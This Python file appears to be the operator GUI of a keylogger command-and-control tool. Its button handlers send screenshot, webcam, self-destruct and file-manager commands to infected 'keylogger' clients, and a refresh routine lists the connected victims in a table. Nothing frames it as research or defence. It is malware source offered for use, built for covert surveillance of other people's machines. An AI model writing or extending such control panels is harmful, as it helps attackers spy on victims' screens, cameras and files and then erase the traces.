import logging
from server import Server
from commands import ScreenshotCommand, WebcamCommand, SelfDestructCommand, FileCommand
from utils import EventHandlerRegister, AsyncTkinter
from .manager import UIManager
from .base import BaseEventHandler


logger = logging.getLogger(__name__)


class ButtonHeaderHandler:
    @staticmethod
    @EventHandlerRegister.registry('main')
    @AsyncTkinter.async_handler
    async def command_main():
        print('Main')

    @staticmethod
    @EventHandlerRegister.registry('info')
    @AsyncTkinter.async_handler
    async def command_info():
        print("Info")

    @staticmethod
    @EventHandlerRegister.registry('create')
    @AsyncTkinter.async_handler
    async def command_create():
        print('Create')

    @staticmethod
    @EventHandlerRegister.registry('screenshot')
    @AsyncTkinter.async_handler
    async def command_screenshot():
        server = Server()
        logger.info(f'Screenshot command send -> {server.selected_keylogger}')
        response = await server.request(ScreenshotCommand)
        response = response.decode() if response else None
        print(response)

    @staticmethod
    @EventHandlerRegister.registry('web_camera')
    @AsyncTkinter.async_handler
    async def command_web():
        server = Server()
        logger.info(f'Camera command send -> {server.selected_keylogger}')
        response = await server.request(WebcamCommand)
        response = response.decode() if response else None if response else None
        print(response)

    @staticmethod
    @EventHandlerRegister.registry('self_destruction')
    @AsyncTkinter.async_handler
    async def command_destruct():
        server = Server()
        logger.info(f'Destruct command send -> {server.selected_keylogger}')
        response = await server.request(SelfDestructCommand)
        response = response.decode() if response else None if response else None
        print(response)

    @staticmethod
    @EventHandlerRegister.registry('file_manager')
    @AsyncTkinter.async_handler
    async def command_file():
        server = Server()
        logger.info(f'File Manager command send -> {server.selected_keylogger}')
        response = await server.request(FileCommand)
        response = response.decode() if response else None
        print(response)


class ButtonMainHandler:
    @staticmethod
    @EventHandlerRegister.registry('refresh_list')
    def command_refresh():
        logger.info('Refresh Table')
        keyloggers = set(Server().clients.keys())
        table = UIManager().window.find('table_keyloggers').builder.widget
        rows = dict(map(lambda item: (tuple(item.values), item.iid), table.get_rows()))
        all_rows = set(rows.keys())
        rows_delete, rows_insert = all_rows - keyloggers, keyloggers - all_rows
        if rows_delete:
            logger.debug(f'Delete Keyloggers - {rows_delete}')
            BaseEventHandler.change_state_header_buttons('disabled')
            rows_delete = list(map(lambda item: rows[item], rows_delete))
            table.delete_rows(iids=rows_delete)
        if rows_insert:
            logger.debug(f'Insert Keyloggers - {rows_insert}')
            table.insert_rows('end', list(rows_insert))
            table.load_table_data()
